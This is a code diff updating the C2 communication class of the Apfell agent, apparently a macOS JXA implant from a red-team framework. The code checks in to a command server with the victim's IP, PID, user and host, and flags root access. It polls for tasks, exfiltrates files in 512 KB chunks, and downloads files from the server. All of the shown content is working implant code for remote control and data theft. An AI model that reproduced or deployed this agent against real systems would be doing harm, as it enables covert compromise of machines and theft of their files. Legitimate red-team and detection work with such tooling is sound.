@@ -77,7 +77,7 @@ class customC2 extends baseC2{
 	    // Encrypt our initial message with sessionID and Public key with the initial AES key
 	    while(true){
 	        try{
-                var base64_pub_encrypted = this.htmlPostData("api/v1.2/crypto/EKE/" + apfell.uuid, initial_message);
+                var base64_pub_encrypted = this.htmlPostData("api/v1.3/crypto/EKE/" + apfell.uuid, initial_message);
                 var pub_encrypted = $.NSData.alloc.initWithBase64Encoding(base64_pub_encrypted);
                 // Decrypt the response with our private key
                 var decrypted_message = $.SecKeyCreateDecryptedData(privatekey, $.kSecKeyAlgorithmRSAEncryptionOAEPSHA1, pub_encrypted, Ref());
@@ -91,6 +91,7 @@ class customC2 extends baseC2{
                 this.cryptokey = $.SecKeyCreateFromData(this.parameters, this.raw_key, Ref());
                 this.exchanging_keys = false;
                 return session_key;
+
             }catch(error){
                 $.NSThread.sleepForTimeInterval(this.interval);  // don't spin out crazy if the connection fails
             }
@@ -112,17 +113,20 @@ class customC2 extends baseC2{
 		//get info about system to check in initially
 		//needs IP, PID, user, host, payload_type
 		var info = {'ip':ip,'pid':pid,'user':user,'host':host,'uuid':apfell.uuid};
+		if(user == "root"){
+		    info['integrity_level'] = 3;
+		}
 		//calls htmlPostData(url,data) to actually checkin
 		//Encrypt our data
 		//gets back a unique ID
-		if(this.exchanging_keys){
-		    var sessionID = this.negotiate_key();
-		    var jsondata = this.htmlPostData("api/v1.2/crypto/EKE/" + sessionID, JSON.stringify(info));
-		}else if(this.aes_psk != ""){
-            var jsondata = this.htmlPostData("api/v1.2/crypto/aes_psk/" + apfell.uuid, JSON.stringify(info));
-		}else{
-		    var jsondata = this.htmlPostData("api/v1.2/callbacks/", JSON.stringify(info));
-		}
+        if(this.exchanging_keys){
+            var sessionID = this.negotiate_key();
+            var jsondata = this.htmlPostData("api/v1.3/crypto/EKE/" + sessionID, JSON.stringify(info));
+        }else if(this.aes_psk != ""){
+            var jsondata = this.htmlPostData("api/v1.3/crypto/aes_psk/" + apfell.uuid, JSON.stringify(info));
+        }else{
+            var jsondata = this.htmlPostData("api/v1.3/callbacks/", JSON.stringify(info));
+        }
 		apfell.id = jsondata.id;
 		// if we fail to get a new ID number, then exit the application
 		if(apfell.id == undefined){ $.NSApplication.sharedApplication.terminate(this); }
@@ -131,7 +135,7 @@ class customC2 extends baseC2{
 	getTasking(){
 		while(true){
 		    try{
-		        var url = this.baseurl + "api/v1.2/tasks/callback/" + apfell.id + "/nextTask";
+		        var url = this.baseurl + "api/v1.3/tasks/callback/" + apfell.id + "/nextTask";
 		        var task = this.htmlGetData(url);
 		        return JSON.parse(task);
 		    }
@@ -143,7 +147,7 @@ class customC2 extends baseC2{
 	}
 	postResponse(task, output){
 	    // this will get the task object and the response output
-	    return this.postRESTResponse("api/v1.2/responses/" + task.id, output);
+	    return this.postRESTResponse("api/v1.3/responses/" + task.id, output);
 	}
 	postRESTResponse(urlEnding, data){
 		//depending on the amount of data we're sending, we might need to chunk it
@@ -186,6 +190,13 @@ class customC2 extends baseC2{
 				var error = Ref();
 				var responseData = $.NSURLConnection.sendSynchronousRequestReturningResponseError(req,response,error);
 				var resp = $.NSString.alloc.initWithDataEncoding(responseData, $.NSUTF8StringEncoding);
+				var deepresp = ObjC.deepUnwrap(resp);
+				if(deepresp[0] == "<"|| deepresp.length == 0 || deepresp.includes("ERROR: Requested URL")){
+                    //this means we likely got back some form of error or redirect message, not our actual data
+                    //console.log(deepresp);
+                    continue;
+                }
+
 				//console.log("response: " + resp.js);
 				if(!this.exchanging_keys){
 				    //we're not doing the initial key exchange
@@ -198,7 +209,6 @@ class customC2 extends baseC2{
                         //we don't need to decrypt it, so we can just parse and return it
                         return JSON.parse(resp.js);
 				    }
-
 				}
 				else{
 				    //if we are currently exchanging keys, just return the response so we can decrypt it differently
@@ -223,6 +233,13 @@ class customC2 extends baseC2{
                 var error = Ref();
                 var responseData = $.NSURLConnection.sendSynchronousRequestReturningResponseError(req,response,error);
                 var data = $.NSString.alloc.initWithDataEncoding(responseData, $.NSUTF8StringEncoding);
+                var deepresp = ObjC.deepUnwrap(data);
+				if(deepresp[0] == "<"|| deepresp.length == 0 || deepresp.includes("ERROR: Requested URL")){
+                    //this means we likely got back some form of error or redirect message, not our actual data
+                    //console.log(deepresp);
+                    continue;
+                }
+
                 if(this.aes_psk != ""){
                     var decrypted_message = this.decrypt_message(data);
                 }else{
@@ -239,16 +256,27 @@ class customC2 extends baseC2{
 	}
 	download(task, params){
         // download just has one parameter of the path of the file to download
-        if( does_file_exist(params)){
+        if( does_file_exist(params) ){
             var offset = 0;
-            var url = "api/v1.2/responses/" + task.id;
+            var url = "api/v1.3/responses/" + task.id;
             var chunkSize = 512000; //3500;
-            var handle = $.NSFileHandle.fileHandleForReadingAtPath(params);
-            // Get the file size by seeking;
-            var fileSize = handle.seekToEndOfFile;
+            // get the full real path to the file
+            try{
+                if(params[0] != "/"){
+                    var fileManager = $.NSFileManager.defaultManager;
+                    var cwd = fileManager.currentDirectoryPath.js;
+                    params = cwd + "/" + params;
+                }
+                var handle = $.NSFileHandle.fileHandleForReadingAtPath(params);
+                // Get the file size by seeking;
+                var fileSize = handle.seekToEndOfFile;
+            }catch(error){
+                output = JSON.stringify({'status': 'error', 'error': error.toString()})
+            }
+
             // always round up to account for chunks that are < chunksize;
             var numOfChunks = Math.ceil(fileSize / chunkSize);
-            var registerData = JSON.stringify({'total_chunks': numOfChunks, 'task': task.id});
+            var registerData = JSON.stringify({'total_chunks': numOfChunks, 'task': task.id, 'full_path': params});
             var registerData = convert_to_nsdata(registerData);
             var registerFile = this.htmlPostData(url, JSON.stringify({"response": registerData.base64EncodedStringWithOptions(0).js}));
             //var registerFile = this.postResponse(task, registerData);
@@ -270,21 +298,20 @@ class customC2 extends baseC2{
                     currentChunk += 1;
                     data = handle.readDataOfLength(chunkSize);
                 }
-                var output = "Finished downloading file with id: " + registerFile['file_id'];
-                output += "\nBrowse to /api/v1.2/files/download/" + registerFile['file_id'];
+                var output = JSON.stringify({"status":"finished", "file_id": registerFile['file_id']})
             }
             else{
-               var output = "Failed to register file to download";
+               var output = JSON.stringify({'status': 'error', 'error': "Failed to register file to download"});
             }
         }
         else{
-            var output = "file does not exist";
+            var output = JSON.stringify({'status': 'error', 'error': "file does not exist"});
         }
         return output;
 	}
 	upload(task, params){
 	    try{
-	        var url = "api/v1.2/files/" + params + "/callbacks/" + apfell.id;
+	        var url = "api/v1.3/files/" + params + "/callbacks/" + apfell.id;
             var file_data = this.htmlGetData(this.baseurl + url);
             if(file_data === undefined){
                 throw "Got nothing from the Apfell server";
